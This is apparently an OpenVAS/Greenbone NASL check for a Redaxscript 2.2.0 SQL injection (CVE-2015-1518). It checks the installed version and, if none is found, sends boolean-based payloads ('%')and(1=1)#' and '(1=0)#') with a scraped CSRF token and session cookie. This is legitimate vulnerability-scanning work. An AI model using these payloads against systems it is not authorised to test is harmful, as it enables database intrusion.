CPE = "cpe:/a:redaxscript:redaxscript";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105954" );
	script_version( "2021-05-18T07:19:12+0000" );
	script_tag( name: "last_modification", value: "2021-05-18 07:19:12 +0000 (Tue, 18 May 2021)" );
	script_tag( name: "creation_date", value: "2015-02-06 14:11:04 +0700 (Fri, 06 Feb 2015)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2015-1518" );
	script_bugtraq_id( 72581 );
	script_name( "Redaxscript < 2.3.0 SQLi Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "redaxscript_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "redaxscript/detected" );
	script_xref( name: "URL", value: "http://www.itas.vn/news/itas-team-found-out-a-sql-injection-vulnerability-in-redaxscript-2-2-0-cms-75.html" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/36023/" );
	script_tag( name: "summary", value: "Redaxscript is prone to an SQL injection (SQLi) vulnerability." );
	script_tag( name: "vuldetect", value: "Checks if a vulnerable version is present on the target host.
  If no version was detected a try to perform an SQLi is done." );
	script_tag( name: "insight", value: "The search_post function in includes/search.php is prone to an
  SQLi vulnerability in the search_terms parameter." );
	script_tag( name: "impact", value: "An unauthenticated attacker might execute arbitrary SQL commands
  to compromise the application, access or modify data, or exploit latent vulnerabilities in the
  underlying database." );
	script_tag( name: "affected", value: "Radexscript 2.2.0." );
	script_tag( name: "solution", value: "Update to Radexscript 2.3.0 or later." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("version_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!infos = get_app_version_and_location( cpe: CPE, port: port, exit_no_version: FALSE )){
	exit( 0 );
}
vers = infos["version"];
dir = infos["location"];
if( vers && vers != "unknown" ){
	if(version_is_equal( version: vers, test_version: "2.2.0" )){
		report = report_fixed_ver( installed_version: vers, fixed_version: "2.3.0", install_path: dir );
		security_message( port: port, data: report );
		exit( 0 );
	}
	exit( 99 );
}
else {
	if(!dir){
		exit( 0 );
	}
	useragent = http_get_user_agent();
	host = http_host_name( port: port );
	req = "GET / HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" + "Accept-Language: en-US,en;q=0.5\r\n\r\n";
	res = http_keepalive_send_recv( port: port, data: req );
	token = eregmatch( pattern: "token\" value=\"([0-9a-z]*)\"", string: res );
	temp = split( buffer: res, sep: "Set-Cookie:" );
	cookie = eregmatch( pattern: "PHPSESSID=([0-9a-z]+);", string: temp[max_index( temp ) - 1] );
	data = NASLString( "search_terms=%')and(1=1)#&search_post=&token=", token[1], "&search_post=Search" );
	len = strlen( data );
	req = "POST " + dir + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" + "Accept-Language: en-US,en;q=0.5\r\n" + "Cookie: PHPSESSID=" + cookie[1] + "\r\n" + "Content-Type: application/x-www-form-urlencoded\r\n" + "Content-Length: " + len + "\r\n" + "\r\n" + data;
	res = http_keepalive_send_recv( port: port, data: req );
	if(!ContainsString( res, ">Something went wrong<" )){
		data = NASLString( "search_terms=%')and(1=0)#&search_post=&token=", token[1], "&search_post=Search" );
		len = strlen( data );
		req = "POST " + dir + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" + "Accept-Language: en-US,en;q=0.5\r\n" + "Cookie: PHPSESSID=" + cookie[1] + "\r\n" + "Content-Type: application/x-www-form-urlencoded\r\n" + "Content-Length: " + len + "\r\n" + "\r\n" + data;
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, ">Something went wrong<" )){
			report = http_report_vuln_url( port: port, url: dir );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

